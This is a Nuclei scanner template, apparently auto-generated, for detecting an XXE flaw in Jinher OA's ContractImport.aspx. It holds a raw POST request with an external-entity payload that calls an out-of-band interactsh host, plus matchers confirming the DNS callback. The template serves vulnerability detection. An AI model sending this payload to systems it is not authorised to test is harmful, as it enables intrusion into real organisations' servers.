id: jinher-contractimport-aspx-xxe
info:
  name: 金和OA ContractImport.aspx XXE漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: xxe,DNSLOG

variables:
  reverse_dns: "{{interactsh-url}}"

http:
  - raw:
      - |
        POST /c6/JHSoft.Web.ContractManagement/Importing/ContractImport.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
        <!ENTITY % remote SYSTEM "http://{{reverse_dns}}/xxe_test">
        %remote;]>
        <root/>
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "SessionId="
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
